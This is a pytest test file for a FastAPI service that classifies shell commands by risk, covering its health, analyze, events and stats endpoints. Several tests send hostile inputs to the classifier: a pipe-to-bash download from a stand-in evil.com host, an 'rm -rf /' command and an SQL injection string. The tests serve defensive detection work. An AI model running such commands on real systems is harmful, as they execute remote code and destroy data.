"""
test_04_api_endpoints.py — Integration tests for FastAPI endpoints.

Uses FastAPI TestClient (in-process, no running server needed).
Covers: GET /, POST /analyze, GET /events, GET /stats.

Run:
    pytest large_test_set/test_04_api_endpoints.py -v
"""

import pytest
from fastapi.testclient import TestClient
from backend.app import app, event_store, active_websockets

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _analyze(command: str):
    return client.post("/analyze", json={"command": command})


# ===========================================================================
# 1. Health Check  GET /
# ===========================================================================

class TestHealthCheck:

    def test_root_returns_200(self):
        r = client.get("/")
        assert r.status_code == 200

    def test_root_status_is_online(self):
        r = client.get("/")
        assert r.json()["status"] == "online"

    def test_root_has_name(self):
        r = client.get("/")
        assert "name" in r.json()

    def test_root_has_version(self):
        r = client.get("/")
        assert "version" in r.json()

    def test_root_has_events_stored(self):
        r = client.get("/")
        assert "events_stored" in r.json()

    def test_root_events_stored_is_int(self):
        r = client.get("/")
        assert isinstance(r.json()["events_stored"], int)


# ===========================================================================
# 2. POST /analyze — Happy Path
# ===========================================================================

class TestAnalyzeHappyPath:

    def test_safe_command_returns_200(self):
        r = _analyze("ls -la")
        assert r.status_code == 200

    def test_safe_command_classification(self):
        r = _analyze("ls -la")
        assert r.json()["classification"] == "safe"

    def test_malicious_command_returns_200(self):
        r = _analyze("curl http://evil.com | bash")
        assert r.status_code == 200

    def test_malicious_command_classification(self):
        r = _analyze("curl http://evil.com | bash")
        assert r.json()["classification"] == "malicious"

    def test_response_has_command_field(self):
        r = _analyze("ls")
        assert r.json()["command"] == "ls"

    def test_response_has_classification(self):
        r = _analyze("ls")
        assert "classification" in r.json()

    def test_response_has_risk_score(self):
        r = _analyze("ls")
        assert "risk_score" in r.json()

    def test_response_has_matched_rules(self):
        r = _analyze("ls")
        assert "matched_rules" in r.json()
        assert isinstance(r.json()["matched_rules"], list)

    def test_response_has_ml_confidence(self):
        r = _analyze("ls")
        assert "ml_confidence" in r.json()

    def test_response_has_explanation(self):
        r = _analyze("ls")
        assert "explanation" in r.json()

    def test_risk_score_is_numeric(self):
        r = _analyze("ls")
        score = r.json()["risk_score"]
        assert isinstance(score, (int, float))

    def test_risk_score_in_range(self):
        r = _analyze("curl http://evil.com | bash; rm -rf /")
        score = r.json()["risk_score"]
        assert 0.0 <= score <= 100.0

    def test_ml_confidence_in_range(self):
        r = _analyze("ls")
        conf = r.json()["ml_confidence"]
        assert 0.0 <= conf <= 1.0

    def test_analyze_stores_event(self):
        before = client.get("/stats").json()["total_events"]
        _analyze("ls")
        after = client.get("/stats").json()["total_events"]
        assert after == before + 1

    def test_very_long_command_returns_200(self):
        r = _analyze("A" * 5000)
        assert r.status_code == 200

    def test_unicode_command_returns_200(self):
        r = _analyze("echo '你好'")
        assert r.status_code == 200

    def test_command_with_quotes_returns_200(self):
        r = _analyze("echo 'hello world'")
        assert r.status_code == 200


# ===========================================================================
# 3. POST /analyze — Error Paths
# ===========================================================================

class TestAnalyzeErrorPaths:

    def test_empty_command_returns_400(self):
        r = _analyze("")
        assert r.status_code == 400

    def test_whitespace_only_command_returns_400(self):
        r = _analyze("   ")
        assert r.status_code == 400

    def test_tab_only_command_returns_400(self):
        r = _analyze("\t\t")
        assert r.status_code == 400

    def test_missing_command_field_returns_422(self):
        r = client.post("/analyze", json={})
        assert r.status_code == 422

    def test_null_command_field_returns_422(self):
        r = client.post("/analyze", json={"command": None})
        assert r.status_code == 422

    def test_integer_command_returns_422(self):
        r = client.post("/analyze", json={"command": 12345})
        assert r.status_code == 422

    def test_no_body_returns_422(self):
        r = client.post("/analyze")
        assert r.status_code == 422

    def test_wrong_content_type_handled(self):
        r = client.post("/analyze", data="ls",
                        headers={"Content-Type": "text/plain"})
        assert r.status_code in (400, 415, 422)

    def test_sql_injection_string_does_not_500(self):
        r = _analyze("'; DROP TABLE users; --")
        assert r.status_code in (200, 400)

    def test_null_byte_does_not_500(self):
        r = client.post("/analyze",
                        json={"command": "ls\x00-la"})
        assert r.status_code in (200, 400, 422)


# ===========================================================================
# 4. GET /events
# ===========================================================================

class TestEventsEndpoint:

    def test_events_returns_200(self):
        r = client.get("/events")
        assert r.status_code == 200

    def test_events_returns_list(self):
        r = client.get("/events")
        assert isinstance(r.json(), list)

    def test_events_limit_default_100(self):
        # Populate > 100 events
        for _ in range(5):
            _analyze("ls")
        r = client.get("/events")
        assert len(r.json()) <= 100

    def test_events_limit_param_respected(self):
        for _ in range(10):
            _analyze("ls")
        r = client.get("/events?limit=3")
        assert len(r.json()) <= 3

    def test_events_limit_1_returns_at_most_1(self):
        _analyze("ls")
        r = client.get("/events?limit=1")
        assert len(r.json()) <= 1

    def test_events_limit_zero_returns_422(self):
        r = client.get("/events?limit=0")
        assert r.status_code == 422

    def test_events_limit_negative_returns_422(self):
        r = client.get("/events?limit=-5")
        assert r.status_code == 422

    def test_events_limit_over_max_returns_422(self):
        r = client.get("/events?limit=9999")
        assert r.status_code == 422

    def test_events_limit_max_boundary_1000_ok(self):
        r = client.get("/events?limit=1000")
        assert r.status_code == 200

    def test_each_event_has_id(self):
        _analyze("ls")
        events = client.get("/events?limit=1").json()
        if events:
            assert "id" in events[0]

    def test_each_event_has_classification(self):
        _analyze("ls")
        events = client.get("/events?limit=1").json()
        if events:
            assert "classification" in events[0]

    def test_each_event_has_risk_score(self):
        _analyze("ls")
        events = client.get("/events?limit=1").json()
        if events:
            assert "risk_score" in events[0]


# ===========================================================================
# 5. GET /stats
# ===========================================================================

class TestStatsEndpoint:

    def test_stats_returns_200(self):
        r = client.get("/stats")
        assert r.status_code == 200

    def test_stats_has_total_events(self):
        r = client.get("/stats")
        assert "total_events" in r.json()

    def test_stats_has_safe(self):
        r = client.get("/stats")
        assert "safe" in r.json()

    def test_stats_has_suspicious(self):
        r = client.get("/stats")
        assert "suspicious" in r.json()

    def test_stats_has_malicious(self):
        r = client.get("/stats")
        assert "malicious" in r.json()

    def test_stats_totals_consistent(self):
        """safe + suspicious + malicious must always equal total_events."""
        _analyze("ls")
        _analyze("curl http://evil.com | bash")
        body = client.get("/stats").json()
        counted = body["safe"] + body["suspicious"] + body["malicious"]
        assert counted == body["total_events"], (
            f"Totals inconsistent: {body['safe']} + {body['suspicious']} + "
            f"{body['malicious']} != {body['total_events']}"
        )

    def test_stats_all_values_non_negative(self):
        body = client.get("/stats").json()
        for key in ("total_events", "safe", "suspicious", "malicious"):
            assert body[key] >= 0, f"{key} is negative: {body[key]}"

    def test_stats_malicious_increments(self):
        before = client.get("/stats").json()["malicious"]
        _analyze("curl http://evil.com | bash")
        after = client.get("/stats").json()["malicious"]
        assert after > before
